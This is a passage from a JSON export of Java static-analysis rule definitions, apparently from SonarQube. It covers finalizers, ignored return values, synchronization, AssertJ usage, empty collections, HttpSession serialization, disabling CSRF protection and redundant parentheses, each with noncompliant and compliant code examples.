            "mdDesc": "<p>The <code>Object.finalize()</code> method is called on an object by the garbage collector when it determines that there are no more references to\nthe object. But there is absolutely no warranty that this method will be called AS SOON AS the last references to the object are removed. It can be\nfew microseconds to few minutes later. So when system resources need to be disposed by an object, it's better to not rely on this asynchronous\nmechanism to dispose them.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  ...\n  protected void finalize() {\n    releaseSomeResources();    // Noncompliant\n  }\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "unpredictable"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2201",
            "repo": "java",
            "name": "Return values from functions without side effects should not be ignored",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When the call to a function doesn't have any side effects, what is the point of making the call if the results are ignored? In such case, either\nthe function call is useless and should be dropped or the source code doesn't behave as expected.</p>\n<p>To prevent generating any false-positives, this rule triggers an issue only on the following predefined list of immutable classes in the Java API\n:</p>\n<ul>\n  <li> <code>java.lang.String</code> </li>\n  <li> <code>java.lang.Boolean</code> </li>\n  <li> <code>java.lang.Integer</code> </li>\n  <li> <code>java.lang.Double</code> </li>\n  <li> <code>java.lang.Float</code> </li>\n  <li> <code>java.lang.Byte</code> </li>\n  <li> <code>java.lang.Character</code> </li>\n  <li> <code>java.lang.Short</code> </li>\n  <li> <code>java.lang.StackTraceElement</code> </li>\n  <li> <code>java.time.DayOfWeek</code> </li>\n  <li> <code>java.time.Duration</code> </li>\n  <li> <code>java.time.Instant</code> </li>\n  <li> <code>java.time.LocalDate</code> </li>\n  <li> <code>java.time.LocalDateTime</code> </li>\n  <li> <code>java.time.LocalTime</code> </li>\n  <li> <code>java.time.Month</code> </li>\n  <li> <code>java.time.MonthDay</code> </li>\n  <li> <code>java.time.OffsetDateTime</code> </li>\n  <li> <code>java.time.OffsetTime</code> </li>\n  <li> <code>java.time.Period</code> </li>\n  <li> <code>java.time.Year</code> </li>\n  <li> <code>java.time.YearMonth</code> </li>\n  <li> <code>java.time.ZonedDateTime</code> </li>\n  <li> <code>java.math.BigInteger</code> </li>\n  <li> <code>java.math.BigDecimal</code> </li>\n  <li> <code>java.util.Optional</code> </li>\n</ul>\n<p>As well as methods of the following classes:</p>\n<ul>\n  <li> <code>java.util.Collection</code>:\n    <ul>\n      <li> <code>size()</code> </li>\n      <li> <code>isEmpty()</code> </li>\n      <li> <code>contains(...)</code> </li>\n      <li> <code>containsAll(...)</code> </li>\n      <li> <code>iterator()</code> </li>\n      <li> <code>toArray()</code> </li>\n    </ul> </li>\n  <li> <code>java.util.Map</code>:\n    <ul>\n      <li> <code>size()</code> </li>\n      <li> <code>isEmpty()</code> </li>\n      <li> <code>containsKey(...)</code> </li>\n      <li> <code>containsValue(...)</code> </li>\n      <li> <code>get(...)</code> </li>\n      <li> <code>getOrDefault(...)</code> </li>\n      <li> <code>keySet()</code> </li>\n      <li> <code>entrySet()</code> </li>\n      <li> <code>values()</code> </li>\n    </ul> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void handle(String command){\n  command.toLowerCase(); // Noncompliant; result of method thrown away\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void handle(String command){\n  String formattedCommand = command.toLowerCase();\n  ...\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule will not raise an issue when both these conditions are met:</p>\n<ul>\n  <li> The method call is in a <code>try</code> block with an associated <code>catch</code> clause. </li>\n  <li> The method name starts with \"parse\", \"format\", \"decode\" or \"valueOf\" or the method is <code>String.getBytes(Charset)</code>. </li>\n</ul>\n<pre>\nprivate boolean textIsInteger(String textToCheck) {\n\n    try {\n        Integer.parseInt(textToCheck, 10); // OK\n        return true;\n    } catch (NumberFormatException ignored) {\n        return false;\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/xzdGBQ\">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>\n</ul>",
            "mdDesc": "<p>When the call to a function doesn't have any side effects, what is the point of making the call if the results are ignored? In such case, either\nthe function call is useless and should be dropped or the source code doesn't behave as expected.</p>\n<p>To prevent generating any false-positives, this rule triggers an issue only on the following predefined list of immutable classes in the Java API\n:</p>\n<ul>\n  <li> <code>java.lang.String</code> </li>\n  <li> <code>java.lang.Boolean</code> </li>\n  <li> <code>java.lang.Integer</code> </li>\n  <li> <code>java.lang.Double</code> </li>\n  <li> <code>java.lang.Float</code> </li>\n  <li> <code>java.lang.Byte</code> </li>\n  <li> <code>java.lang.Character</code> </li>\n  <li> <code>java.lang.Short</code> </li>\n  <li> <code>java.lang.StackTraceElement</code> </li>\n  <li> <code>java.time.DayOfWeek</code> </li>\n  <li> <code>java.time.Duration</code> </li>\n  <li> <code>java.time.Instant</code> </li>\n  <li> <code>java.time.LocalDate</code> </li>\n  <li> <code>java.time.LocalDateTime</code> </li>\n  <li> <code>java.time.LocalTime</code> </li>\n  <li> <code>java.time.Month</code> </li>\n  <li> <code>java.time.MonthDay</code> </li>\n  <li> <code>java.time.OffsetDateTime</code> </li>\n  <li> <code>java.time.OffsetTime</code> </li>\n  <li> <code>java.time.Period</code> </li>\n  <li> <code>java.time.Year</code> </li>\n  <li> <code>java.time.YearMonth</code> </li>\n  <li> <code>java.time.ZonedDateTime</code> </li>\n  <li> <code>java.math.BigInteger</code> </li>\n  <li> <code>java.math.BigDecimal</code> </li>\n  <li> <code>java.util.Optional</code> </li>\n</ul>\n<p>As well as methods of the following classes:</p>\n<ul>\n  <li> <code>java.util.Collection</code>:\n    <ul>\n      <li> <code>size()</code> </li>\n      <li> <code>isEmpty()</code> </li>\n      <li> <code>contains(...)</code> </li>\n      <li> <code>containsAll(...)</code> </li>\n      <li> <code>iterator()</code> </li>\n      <li> <code>toArray()</code> </li>\n    </ul> </li>\n  <li> <code>java.util.Map</code>:\n    <ul>\n      <li> <code>size()</code> </li>\n      <li> <code>isEmpty()</code> </li>\n      <li> <code>containsKey(...)</code> </li>\n      <li> <code>containsValue(...)</code> </li>\n      <li> <code>get(...)</code> </li>\n      <li> <code>getOrDefault(...)</code> </li>\n      <li> <code>keySet()</code> </li>\n      <li> <code>entrySet()</code> </li>\n      <li> <code>values()</code> </li>\n    </ul> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void handle(String command){\n  command.toLowerCase(); // Noncompliant; result of method thrown away\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void handle(String command){\n  String formattedCommand = command.toLowerCase();\n  ...\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule will not raise an issue when both these conditions are met:</p>\n<ul>\n  <li> The method call is in a <code>try</code> block with an associated <code>catch</code> clause. </li>\n  <li> The method name starts with \"parse\", \"format\", \"decode\" or \"valueOf\" or the method is <code>String.getBytes(Charset)</code>. </li>\n</ul>\n<pre>\nprivate boolean textIsInteger(String textToCheck) {\n\n    try {\n        Integer.parseInt(textToCheck, 10); // OK\n        return true;\n    } catch (NumberFormatException ignored) {\n        return false;\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/xzdGBQ\">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2444",
            "repo": "java",
            "name": "Lazy initialization of \"static\" fields should be \"synchronized\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>In a multi-threaded situation, un-<code>synchronized</code> lazy initialization of static fields could mean that a second thread has access to a\nhalf-initialized object while the first thread is still creating it. Allowing such access could cause serious bugs. Instead. the initialization block\nshould be <code>synchronized</code>.</p>\n<p>Similarly, updates of such fields should also be <code>synchronized</code>.</p>\n<p>This rule raises an issue whenever a lazy static initialization is done on a class with at least one <code>synchronized</code> method, indicating\nintended usage in multi-threaded applications.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate static Properties fPreferences = null;\n\nprivate static Properties getPreferences() {\n        if (fPreferences == null) {\n            fPreferences = new Properties(); // Noncompliant\n            fPreferences.put(\"loading\", \"true\");\n            fPreferences.put(\"filterstack\", \"true\");\n            readPreferences();\n        }\n        return fPreferences;\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate static Properties fPreferences = null;\n\nprivate static synchronized Properties getPreferences() {\n        if (fPreferences == null) {\n            fPreferences = new Properties();\n            fPreferences.put(\"loading\", \"true\");\n            fPreferences.put(\"filterstack\", \"true\");\n            readPreferences();\n        }\n        return fPreferences;\n    }\n}\n</pre>",
            "mdDesc": "<p>In a multi-threaded situation, un-<code>synchronized</code> lazy initialization of static fields could mean that a second thread has access to a\nhalf-initialized object while the first thread is still creating it. Allowing such access could cause serious bugs. Instead. the initialization block\nshould be <code>synchronized</code>.</p>\n<p>Similarly, updates of such fields should also be <code>synchronized</code>.</p>\n<p>This rule raises an issue whenever a lazy static initialization is done on a class with at least one <code>synchronized</code> method, indicating\nintended usage in multi-threaded applications.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate static Properties fPreferences = null;\n\nprivate static Properties getPreferences() {\n        if (fPreferences == null) {\n            fPreferences = new Properties(); // Noncompliant\n            fPreferences.put(\"loading\", \"true\");\n            fPreferences.put(\"filterstack\", \"true\");\n            readPreferences();\n        }\n        return fPreferences;\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate static Properties fPreferences = null;\n\nprivate static synchronized Properties getPreferences() {\n        if (fPreferences == null) {\n            fPreferences = new Properties();\n            fPreferences.put(\"loading\", \"true\");\n            fPreferences.put(\"filterstack\", \"true\");\n            readPreferences();\n        }\n        return fPreferences;\n    }\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5833",
            "repo": "java",
            "name": "AssertJ methods setting the assertion context should come before an assertion",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Describing, setting error message or adding a comparator in <a href=\"https://assertj.github.io/doc/\">AssertJ</a> must be done before calling the\nassertion, otherwise, settings will not be taken into account.</p>\n<p>This rule raises an issue when one of the method (with all similar methods):</p>\n<ul>\n  <li> <code>as</code> </li>\n  <li> <code>describedAs</code> </li>\n  <li> <code>withFailMessage</code> </li>\n  <li> <code>overridingErrorMessage</code> </li>\n  <li> <code>usingComparator</code> </li>\n  <li> <code>usingElementComparator</code> </li>\n  <li> <code>extracting</code> </li>\n  <li> <code>filteredOn</code> </li>\n</ul>\n<p>is called without calling an AssertJ assertion afterward.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertThat(actual).isEqualTo(expected).as(\"Description\"); // Noncompliant\nassertThat(actual).isEqualTo(expected).withFailMessage(\"Fail message\"); // Noncompliant\nassertThat(actual).isEqualTo(expected).usingComparator(new CustomComparator()); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThat(actual).as(\"Description\").isEqualTo(expected);\nassertThat(actual).withFailMessage(\"Fail message\").isEqualTo(expected);\nassertThat(actual).usingComparator(new CustomComparator()).isEqualTo(expected);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://assertj.github.io/doc/#calling-as-after-the-assertion\">AssertJ incorrect usage documentation</a> </li>\n</ul>",
            "mdDesc": "<p>Describing, setting error message or adding a comparator in <a href=\"https://assertj.github.io/doc/\">AssertJ</a> must be done before calling the\nassertion, otherwise, settings will not be taken into account.</p>\n<p>This rule raises an issue when one of the method (with all similar methods):</p>\n<ul>\n  <li> <code>as</code> </li>\n  <li> <code>describedAs</code> </li>\n  <li> <code>withFailMessage</code> </li>\n  <li> <code>overridingErrorMessage</code> </li>\n  <li> <code>usingComparator</code> </li>\n  <li> <code>usingElementComparator</code> </li>\n  <li> <code>extracting</code> </li>\n  <li> <code>filteredOn</code> </li>\n</ul>\n<p>is called without calling an AssertJ assertion afterward.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertThat(actual).isEqualTo(expected).as(\"Description\"); // Noncompliant\nassertThat(actual).isEqualTo(expected).withFailMessage(\"Fail message\"); // Noncompliant\nassertThat(actual).isEqualTo(expected).usingComparator(new CustomComparator()); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThat(actual).as(\"Description\").isEqualTo(expected);\nassertThat(actual).withFailMessage(\"Fail message\").isEqualTo(expected);\nassertThat(actual).usingComparator(new CustomComparator()).isEqualTo(expected);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://assertj.github.io/doc/#calling-as-after-the-assertion\">AssertJ incorrect usage documentation</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "assertj",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1596",
            "repo": "java",
            "name": "\"Collections.EMPTY_LIST\", \"EMPTY_MAP\", and \"EMPTY_SET\" should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Since the introduction of generics in Java 5, the use of generic types such as <code>List&lt;String&gt;</code> is recommended over the use of raw\nones such as <code>List</code>. Assigning a raw type to a generic one is not type safe, and will generate a warning. The old <code>EMPTY_...</code>\nfields of the <code>Collections</code> class return raw types, whereas the newer <code>empty...()</code> methods return generic ones.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList&lt;String&gt; collection1 = Collections.EMPTY_LIST;  // Noncompliant\nMap&lt;String, String&gt; collection2 = Collections.EMPTY_MAP;  // Noncompliant\nSet&lt;String&gt; collection3 = Collections.EMPTY_SET;  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nList&lt;String&gt; collection1 = Collections.emptyList();\nMap&lt;String, String&gt; collection2 = Collections.emptyMap();\nSet&lt;String&gt; collection3 = Collections.emptySet();\n</pre>",
            "mdDesc": "<p>Since the introduction of generics in Java 5, the use of generic types such as <code>List&lt;String&gt;</code> is recommended over the use of raw\nones such as <code>List</code>. Assigning a raw type to a generic one is not type safe, and will generate a warning. The old <code>EMPTY_...</code>\nfields of the <code>Collections</code> class return raw types, whereas the newer <code>empty...()</code> methods return generic ones.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList&lt;String&gt; collection1 = Collections.EMPTY_LIST;  // Noncompliant\nMap&lt;String, String&gt; collection2 = Collections.EMPTY_MAP;  // Noncompliant\nSet&lt;String&gt; collection3 = Collections.EMPTY_SET;  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nList&lt;String&gt; collection1 = Collections.emptyList();\nMap&lt;String, String&gt; collection2 = Collections.emptyMap();\nSet&lt;String&gt; collection3 = Collections.emptySet();\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "obsolete",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2441",
            "repo": "java",
            "name": "Non-serializable objects should not be stored in \"HttpSession\" objects",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If you have no intention of writting an <code>HttpSession</code> object to file, then storing non-<code>serializable</code> objects in it may not\nseem like a big deal. But whether or not you explicitly serialize the session, it may be written to disk anyway, as the server manages its memory use\nin a process called \"passivation\". Further, some servers automatically write their active sessions out to file at shutdown &amp; deserialize any such\nsessions at startup.</p>\n<p>The point is, that even though <code>HttpSession</code> does not <code>extend Serializable</code>, you must nonetheless assume that it will be\nserialized, and understand that if you've stored non-serializable objects in the session, errors will result. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Address {\n  //...\n}\n\n//...\nHttpSession session = request.getSession();\nsession.setAttribute(\"address\", new Address());  // Noncompliant; Address isn't serializable\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/579.html\">MITRE, CWE-579</a> - J2EE Bad Practices: Non-serializable Object Stored in Session\n  </li>\n</ul>",
            "mdDesc": "<p>If you have no intention of writting an <code>HttpSession</code> object to file, then storing non-<code>serializable</code> objects in it may not\nseem like a big deal. But whether or not you explicitly serialize the session, it may be written to disk anyway, as the server manages its memory use\nin a process called \"passivation\". Further, some servers automatically write their active sessions out to file at shutdown &amp; deserialize any such\nsessions at startup.</p>\n<p>The point is, that even though <code>HttpSession</code> does not <code>extend Serializable</code>, you must nonetheless assume that it will be\nserialized, and understand that if you've stored non-serializable objects in the session, errors will result. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Address {\n  //...\n}\n\n//...\nHttpSession session = request.getSession();\nsession.setAttribute(\"address\", new Address());  // Noncompliant; Address isn't serializable\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/579.html\">MITRE, CWE-579</a> - J2EE Bad Practices: Non-serializable Object Stored in Session\n  </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4502",
            "repo": "java",
            "name": "Disabling CSRF protections is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Cross-site request forgery (CSRF) vulnerabilities occur when attackers can trick a user to perform sensitive authenticated operations on a web\napplication without his consent.</p>\n<p>Imagine a web application where an authenticated user can do actions like changing his email address and which has no CSRF protection. A malicious\nwebsite could forge a web page form to send the HTTP request that change the user email. When the user visits the malicious web page, the form is\nautomatically submitted in his name and his account email is changed to an arbitrary email.</p>\n<p>Such an attack is only possible if the web browser automatically sends authentication information to the trusted domain (e.g cookie based\nauthentication) </p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The web application uses cookies to authenticate users. </li>\n  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>\n  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Protection against CSRF attacks is strongly recommended:\n    <ul>\n      <li> to be activated by default for all <a href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">unsafe HTTP\n      methods</a>. </li>\n      <li> implemented, for example, with an unguessable CSRF token </li>\n    </ul> </li>\n  <li> Of course all sensitive operations should not be performed with <a\n  href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">safe HTTP</a> methods like <code>GET</code> which are designed to be\n  used only for information retrieval. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://docs.spring.io/spring-security/site/docs/3.2.0.CI-SNAPSHOT/reference/html/csrf.html\">Spring Security</a> provides by default a\nprotection against CSRF attacks.</p>\n<pre>\n@EnableWebSecurity\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.csrf().disable(); // Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>With <a href=\"https://docs.spring.io/spring-security/site/docs/3.2.0.CI-SNAPSHOT/reference/html/csrf.html\">Spring Security CSRF protection</a> is\nenabled by default, do not disable it.</p>\n<pre>\n@EnableWebSecurity\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    // http.csrf().disable(); // Compliant\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/352.html\">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29\">OWASP: Cross-Site Request Forgery</a> </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n</ul>",
            "mdDesc": "<p>Cross-site request forgery (CSRF) vulnerabilities occur when attackers can trick a user to perform sensitive authenticated operations on a web\napplication without his consent.</p>\n<p>Imagine a web application where an authenticated user can do actions like changing his email address and which has no CSRF protection. A malicious\nwebsite could forge a web page form to send the HTTP request that change the user email. When the user visits the malicious web page, the form is\nautomatically submitted in his name and his account email is changed to an arbitrary email.</p>\n<p>Such an attack is only possible if the web browser automatically sends authentication information to the trusted domain (e.g cookie based\nauthentication) </p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The web application uses cookies to authenticate users. </li>\n  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>\n  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Protection against CSRF attacks is strongly recommended:\n    <ul>\n      <li> to be activated by default for all <a href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">unsafe HTTP\n      methods</a>. </li>\n      <li> implemented, for example, with an unguessable CSRF token </li>\n    </ul> </li>\n  <li> Of course all sensitive operations should not be performed with <a\n  href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">safe HTTP</a> methods like <code>GET</code> which are designed to be\n  used only for information retrieval. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://docs.spring.io/spring-security/site/docs/3.2.0.CI-SNAPSHOT/reference/html/csrf.html\">Spring Security</a> provides by default a\nprotection against CSRF attacks.</p>\n<pre>\n@EnableWebSecurity\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.csrf().disable(); // Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>With <a href=\"https://docs.spring.io/spring-security/site/docs/3.2.0.CI-SNAPSHOT/reference/html/csrf.html\">Spring Security CSRF protection</a> is\nenabled by default, do not disable it.</p>\n<pre>\n@EnableWebSecurity\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    // http.csrf().disable(); // Compliant\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/352.html\">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29\">OWASP: Cross-Site Request Forgery</a> </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a6",
                "sans-top25-insecure",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S1110",
            "repo": "java",
            "name": "Redundant pairs of parentheses should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But\nredundant pairs of parentheses could be misleading, and should be removed. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint x = (y / 2 + 1);   //Compliant even if the parenthesis are ignored by the compiler\n\nif (a &amp;&amp; ((x+y &gt; 0))) {  // Noncompliant\n  //...\n}\n\nreturn ((x + 1));  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint x = (y / 2 + 1);\n\nif (a &amp;&amp; (x+y &gt; 0)) {\n  //...\n}\n\nreturn (x + 1);\n</pre>",
            "mdDesc": "<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But\nredundant pairs of parentheses could be misleading, and should be removed. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint x = (y / 2 + 1);   //Compliant even if the parenthesis are ignored by the compiler\n\nif (a &amp;&amp; ((x+y &gt; 0))) {  // Noncompliant\n  //...\n}\n\nreturn ((x + 1));  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint x = (y / 2 + 1);\n\nif (a &amp;&amp; (x+y &gt; 0)) {\n  //...\n}\n\nreturn (x + 1);\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1111",
            "repo": "java",
            "name": "The Object.finalize() method should not be called",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the official javadoc documentation, this Object.finalize() is called by the garbage collector on an object when garbage collection\ndetermines that there are no more references to the object. Calling this method explicitly breaks this contract and so is misleading. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void dispose() throws Throwable {\n  this.finalize();                       // Noncompliant\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/586.html\">MITRE, CWE-586</a> - Explicit Call to Finalize() </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>",
